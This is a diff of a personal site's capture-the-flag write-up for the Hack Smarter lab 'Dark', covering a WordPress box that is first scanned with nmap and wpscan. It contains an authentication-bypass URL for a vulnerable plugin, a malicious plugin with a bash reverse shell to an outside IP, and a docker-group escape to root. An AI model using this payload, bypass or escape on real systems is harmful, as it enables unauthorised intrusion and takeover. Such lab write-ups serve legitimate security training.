@@ -3,11 +3,12 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Hack Smarter: Dark</title>
-<meta name="description" content="Write-up: Hack Smarter - Dark">
+<title>grehaus — Hack Smarter: Dark</title>
+<meta name="description" content="Hack Smarter: Dark">
+
 <link rel="preconnect" href="https://fonts.googleapis.com">
 <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
-<link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:ital,wght@0,400;0,500;0,600;0,700;0,800;1,400&display=swap" rel="stylesheet">
+<link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:ital,wght@0,500;0,600;0,700;0,800;1,400&display=swap" rel="stylesheet">
 
 <link rel="stylesheet" href="/assets/style.css">
 </head>
@@ -26,7 +27,7 @@
 </header>
 
 <main>
-  <p class="lede">guest@grehaus <span class="path">~/writeups/hack-smarter/labs/Dark</span></p>
+  <p class="lede">guest@grehaus <span class="path">~/writeups/hack-smarter/Dark</span></p>
   <p class="lede back">$ cd .. <a href="../">→ back to hack-smarter/</a></p>
 
   <!-- ============ INFO CARD ============ -->
@@ -36,7 +37,7 @@
       <div class="ic-bar-title">cat Dark.info</div>
     </div>
     <div class="ic-body">
-      <span class="ic-source">Hack Smarter</span>
+      <span class="ic-source">hack-smarter</span>
       <p class="ic-title">Dark</p>
       <dl>
         <div class="ic-row">
@@ -53,19 +54,19 @@
         <div class="ic-row">
           <dt>Tags</dt>
           <dd class="ic-tags">
-            <span>WordPress</span>
             <span>Web Exploitation</span>
+            <span>WordPress</span>
             <span>Docker</span>
           </dd>
         </div>
         <div class="ic-row">
           <dt>Summary</dt>
           <dd class="ic-summary">
-            <span class="lead">Dark:</span> A vulnerable WordPress plugin allows arbitrary RCE granting the user an initial foothold as <code>www-data</code>.
-           Enumeration of our user shows we are in the <code>docker</code> group. Using <code>deepce</code> (Docker Enumeration, Escalation of Privileges and Container Escapes)
-           we can abuse our docker permissions to escalate our privileges to <code>root</code>.
+            <span class="lead">Dark:</span> A vulnerable WordPress plugin allows for arbitrary RCE, which lets the attacker establish a reverse connection as
+            the <code>www-data</code> user. Enumeration of our user shows we are in the <code>docker</code> group. Using <code>deepce</code>
+            (Docker Enumeration, Escalation of Privileges and Container Escapes)
+            we can abuse our docker permissions to escalate our privileges to <code>root</code>.
           </dd>
-
         </div>
       </dl>
     </div>
@@ -78,22 +79,272 @@
       <div class="win-title">guest@grehaus: ~/writeups/hack-smarter/Dark</div>
     </div>
     <div class="win-body">
-      <p class="row"><span class="step-num">[01]</span><span class="prompt">smbclient -N -L //10.10.11.10/</span></p>
-      <p class="row out dim">Null session accepted — anonymous listing enabled.</p>
 
-      <p class="row"><span class="step-num">[02]</span><span class="prompt">smbmap -H 10.10.11.10 -u '' -p ''</span></p>
-      <p class="row out dim">Readable share found containing a config file with plaintext credentials.</p>
+      <p class="row"><span class="step-num">[01]</span><span class="prompt">nmap -sC -sV -vv -oN scans/nmap_all_tcp.txt 10.1.61.224</span></p>
+      <div class="code-block">
+<pre><span class="cmd">nmap -sC -sV -vv -oN scans/nmap_all_tcp.txt 10.1.61.224</span>
+<span class="out">PORT   STATE SERVICE REASON         VERSION
+22/tcp open  ssh     syn-ack ttl 62 OpenSSH 8.9p1 Ubuntu 3ubuntu0.15 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey:
+|   256 a2:fa:00:85:4c:0d:97:79:7b:46:e4:86:1b:18:72:19 (ECDSA)
+| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBLam/VK6YR6qok5qjxAOMQIMtbsBuqTMCcwN54GLSUj647RGe9FJoID+In4rw7Uq5IonEyDaltg+HosxF31l1FU=
+|   256 ea:8d:af:2f:ec:15:d9:32:c0:94:6f:09:03:49:60:36 (ED25519)
+|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAILg3Yms7k9Fk2ZLcerD3FB6RxonH+HtTOpefF4dky0+D
+80/tcp open  http    syn-ack ttl 62 Apache httpd 2.4.52 ((Ubuntu))
+<span class="hl">|_http-generator: WordPress 6.0</span>
+| http-robots.txt: 1 disallowed entry
+|_/wp-admin/
+|_http-title: Dark &amp;#8211; Just another WordPress site
+| http-methods:
+|_  Supported Methods: GET HEAD POST OPTIONS
+|_http-favicon: Unknown favicon MD5: 000BF649CC8F6BF27CFB04D1BCDCD3C7
+|_http-server-header: Apache/2.4.52 (Ubuntu)
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span></pre>
+      </div>
 
-      <p class="row"><span class="step-num">[03]</span><span class="prompt">curl -s http://10.10.11.10/upload.php</span></p>
-      <p class="row out dim">Unrestricted file upload → web shell → initial foothold as service account.</p>
+      <p class="row"><span class="step-num">[02]</span><span class="prompt">wpscan --url http://10.1.61.224 --plugins-detection mixed -e p</span></p>
+      <div class="code-block">
+<pre><span class="cmd">wpscan --url http://10.1.61.224 --plugins-detection mixed -e p</span>
+<span class="out">_______________________________________________________________
+         __          _______   _____
+         \ \        / /  __ \ / ____|
+          \ \  /\  / /| |__) | (___   ___  __ _ _ __ &reg;
+           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
+            \  /\  /  | |     ____) | (__| (_| | | | |
+             \/  \/   |_|    |_____/ \___|\__,_|_| |_|
 
-      <p class="row"><span class="step-num">[04]</span><span class="prompt">whoami /priv</span></p>
-      <p class="row out dim">Pivoted to a second local user via reused credentials from the config file.</p>
+         WordPress Security Scanner by the WPScan Team
+                         Version 3.8.28
+       Sponsored by Automattic - https://automattic.com/
+       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
+_______________________________________________________________
 
-      <p class="row"><span class="step-num">[05]</span><span class="prompt">bloodhound-python -u user -p pass -ns 10.10.11.10 -d lab01.local -c All</span></p>
-      <p class="row out dim">Mapped AD relationships — user held an abusable privilege on a Domain Admin group member.</p>
+[+] URL: http://10.1.61.224/ [10.1.61.224]
+[+] Started: Wed Jul 29 19:56:54 2026
 
-      <p class="row"><span class="step-num">[06]</span><span class="prompt">root flag captured — box owned.</span></p>
+Interesting Finding(s):
+
+[+] Headers
+ | Interesting Entry: Server: Apache/2.4.52 (Ubuntu)
+ | Found By: Headers (Passive Detection)
+ | Confidence: 100%
+
+[+] robots.txt found: http://10.1.61.224/robots.txt
+ | Interesting Entries:
+ |  - /wp-admin/
+ |  - /wp-admin/admin-ajax.php
+ | Found By: Robots Txt (Aggressive Detection)
+ | Confidence: 100%
+
+[+] XML-RPC seems to be enabled: http://10.1.61.224/xmlrpc.php
+ | Found By: Direct Access (Aggressive Detection)
+ | Confidence: 100%
+ | References:
+ |  - http://codex.wordpress.org/XML-RPC_Pingback_API
+ |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/
+ |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/
+ |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/
+ |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/
+
+[+] WordPress readme found: http://10.1.61.224/readme.html
+ | Found By: Direct Access (Aggressive Detection)
+ | Confidence: 100%
+
+[+] Debug Log found: http://10.1.61.224/wp-content/debug.log
+ | Found By: Direct Access (Aggressive Detection)
+ | Confidence: 100%
+ | Reference: https://codex.wordpress.org/Debugging_in_WordPress
+
+[+] The external WP-Cron seems to be enabled: http://10.1.61.224/wp-cron.php
+ | Found By: Direct Access (Aggressive Detection)
+ | Confidence: 60%
+ | References:
+ |  - https://www.iplocation.net/defend-wordpress-from-ddos
+ |  - https://github.com/wpscanteam/wpscan/issues/1299
+
+[+] WordPress version 6.0 identified (Insecure, released on 2022-05-24).
+ | Found By: Rss Generator (Passive Detection)
+ |  - http://10.1.61.224/feed/, &lt;generator&gt;https://wordpress.org/?v=6.0&lt;/generator&gt;
+ |  - http://10.1.61.224/comments/feed/, &lt;generator&gt;https://wordpress.org/?v=6.0&lt;/generator&gt;
+
+[+] WordPress theme in use: twentytwentytwo
+ | Location: http://10.1.61.224/wp-content/themes/twentytwentytwo/
+ | Last Updated: 2025-12-03T00:00:00.000Z
+ | Readme: http://10.1.61.224/wp-content/themes/twentytwentytwo/readme.txt
+ | [!] The version is out of date, the latest version is 2.1
+ | Style URL: http://10.1.61.224/wp-content/themes/twentytwentytwo/style.css?ver=1.2
+ | Style Name: Twenty Twenty-Two
+ | Style URI: https://wordpress.org/themes/twentytwentytwo/
+ | Description: Built on a solidly designed foundation, Twenty Twenty-Two embraces the idea that everyone deserves a...
+ | Author: the WordPress team
+ | Author URI: https://wordpress.org/
+ |
+ | Found By: Css Style In Homepage (Passive Detection)
+ | Confirmed By: Css Style In 404 Page (Passive Detection)
+ |
+ | Version: 1.2 (80% confidence)
+ | Found By: Style (Passive Detection)
+ |  - http://10.1.61.224/wp-content/themes/twentytwentytwo/style.css?ver=1.2, Match: 'Version: 1.2'
+
+[+] Enumerating Most Popular Plugins (via Passive and Aggressive Methods)
+ Checking Known Locations - Time: 00:00:31 &lt;=======================================================================================================================================================================================================&gt; (1499 / 1499) 100.00% Time: 00:00:31
+[+] Checking Plugin Versions (via Passive and Aggressive Methods)
+
+[i] Plugin(s) Identified:
+
+[+] akismet
+ | Location: http://10.1.61.224/wp-content/plugins/akismet/
+ | Latest Version: 5.7
+ | Last Updated: 2026-04-23T22:34:00.000Z
+ |
+ | Found By: Known Locations (Aggressive Detection)
+ |  - http://10.1.61.224/wp-content/plugins/akismet/, status: 403
+ |
+ | The version could not be determined.
+
+<span class="hl">[+] modular-connector</span>
+ | Location: http://10.1.61.224/wp-content/plugins/modular-connector/
+ | Last Updated: 2026-06-26T17:26:00.000Z
+ | Readme: http://10.1.61.224/wp-content/plugins/modular-connector/readme.txt
+ | [!] The version is out of date, the latest version is 3.0.2
+ |
+ | Found By: Known Locations (Aggressive Detection)
+ |  - http://10.1.61.224/wp-content/plugins/modular-connector/, status: 403
+ |
+ | Version: 2.5.0 (80% confidence)
+ | Found By: Readme - Stable Tag (Aggressive Detection)
+ |  - http://10.1.61.224/wp-content/plugins/modular-connector/readme.txt
+
+[!] No WPScan API Token given, as a result vulnerability data has not been output.
+[!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register
+
+[+] Finished: Wed Jul 29 19:57:30 2026
+[+] Requests Done: 1539
+[+] Cached Requests: 11
+[+] Data Sent: 415.934 KB
+[+] Data Received: 690.053 KB
+[+] Memory used: 302.086 MB
+[+] Elapsed time: 00:00:35</span></pre>
+      </div>
+
+      <p class="row out dim">
+        modular-connector 2.5.0 is vulnerable to an authentication bypass <code>(CVE-2026-23550)</code>. We can use the exploit found at
+        <code>https://cvereports.com/reports/CVE-2026-23550</code> to bypass authentication with a special request —
+        <code>http://{target}/api/modular-connector/login/{{random}}?origin=mo&amp;type=1</code>
+      </p>
+
+      <p class="row"><span class="step-num">[03]</span> Uploading a malicious .zip</p>
+      <p class="row out dim">
+        Usually with WordPress sites, the go-to is to edit the source code of any page (I typically use the main or 404 page) to add malicious PHP code.
+        However, we have to upload a malicious plugin instead, since our code is being sanitized. To do this, we create our own plugin:
+      </p>
+      <div class="code-block">
+<pre><span class="out">&lt;?php
+/**
+ * Plugin Name: My Shell
+ * Author: grehaus
+ */
+
+exec("/bin/bash -c 'bash -i &gt;&amp; /dev/tcp/10.200.72.210/9001 0&gt;&amp;1'")
+?&gt;</span></pre>
+      </div>
+      <p class="row out dim">
+        Save that as <code>shell.php</code>, zip it with <code>zip shell.zip shell.php</code>, then upload it via
+        <code>Plugins → Add New → Upload Plugin → select shell.zip → Install Now → start listener → Activate plugin</code>.
+      </p>
+
+      <p class="row"><span class="step-num">[04]</span> Shell as "www-data"</p>
+      <p class="row out dim">
+        Checking our user permissions with <code>id</code>, we can see we are in the docker group —
+        <code>uid=33(www-data) gid=33(www-data) groups=33(www-data),121(docker)</code>. Using deepce, we find a privilege escalation path.
+      </p>
+      <div class="code-block">
+<pre><span class="cmd">bash deepce.sh</span>
+<span class="out">
+                      ##         .
+                ## ## ##        ==
+             ## ## ## ##       ===
+         /"""""""""""""""""\___/ ===
+    ~~~ {~~ ~~~~ ~~~ ~~~~ ~~~ ~ /  ===- ~~~
+         \______ X           __/
+           \    \         __/
+            \____\_______/
+          __
+     ____/ /__  ___  ____  ________
+    / __  / _ \/ _ \/ __ \/ ___/ _ \   ENUMERATE
+   / /_/ /  __/  __/ /_/ / (__/  __/  ESCALATE
+   \__,_/\___/\___/ .___/\___/\___/  ESCAPE
+                 /_/
+
+ Docker Enumeration, Escalation of Privileges and Container Escapes (DEEPCE)
+ by stealthcopter
+
+==========================================( Colors )==========================================
+[+] Exploit Test ............ Exploitable - Check this out
+[+] Basic Test .............. Positive Result
+[+] Another Test ............ Error running check
+[+] Negative Test ........... No
+[+] Multi line test ......... Yes
+Command output
+spanning multiple lines
+
+Tips will look like this and often contains links with additional info. You can usually
+ctrl+click links in modern terminal to open in a browser window
+See https://stealthcopter.github.io/deepce
+
+===================================( Enumerating Platform )===================================
+[+] Inside Container ........ No
+[+] User .................... www-data
+[+] Groups .................. www-data docker
+[+] Sudo .................... Password required
+[+] Container tools ......... Yes
+/usr/bin/docker
+/snap/bin/lxc
+[+] Docker Executable ....... /usr/bin/docker
+[+] Docker version .......... 29.1.3
+[+] Rootless ................ No
+<span class="hl">[+] User in Docker group .... Yes</span>
+Users in the docker group can escalate to root on the host by mounting the host
+partition inside the container and chrooting into it.
+deepce.sh -e DOCKER
+See https://stealthcopter.github.io/deepce/guides/docker-group.md
+
+[+] Docker Sock ............. Yes
+srw-rw---- 1 root docker 0 Jul 30 00:16 /var/run/docker.sock
+[+] Sock is writable ........ Yes
+The docker sock is writable, we should be able to enumerate docker, create containers
+and obtain root privs on the host machine
+See https://stealthcopter.github.io/deepce/guides/docker-sock.md
+
+To see full info from the docker sock output run the following
+
+curl -s --unix-socket /var/run/docker.sock http://localhost/info
+
+KernelVersion:5.15.0-185-generic
+OperatingSystem:Ubuntu 22.04.5 LTS
+OSType:linux
+Architecture:x86_64
+NCPU:2
+DockerRootDir:/var/lib/docker
+Name:dark
+ServerVersion:29.1.3
+Namespaces:{Containers:moby
+[+] Docker Version .......... 29.1.3
+[+] CVE-2019-13139 .......... No
+[+] CVE-2019-5736 ........... No
+==================================( Enumerating Containers )==================================
+[+] Docker Containers........ 0 Running, 0 Total
+CONTAINER ID   IMAGE     COMMAND   CREATED   STATUS    PORTS     NAMES
+==============================================================================================</span></pre>
+      </div>
+
+      <p class="row"><span class="step-num">[05]</span> Privilege escalation</p>
+      <p class="row out dim">
+        From the output we can see that we are able to escalate our privileges by mounting the host system. First we need to upgrade to a proper TTY using
+        <code>python3 -c 'import pty;pty.spawn("/bin/bash")'</code>. Then, following the link, we simply need to run
+        <code>docker run -v /:/mnt --rm -it alpine chroot /mnt /bin/bash</code> — and we're root.
+      </p>
+
     </div>
   </div>
 </main>
@@ -113,6 +364,6 @@
   tick(); setInterval(tick, 1000);
   document.getElementById('year').textContent = new Date().getFullYear();
 </script>
+<script src="/assets/interactive.js"></script>
 </body>
 </html>
-
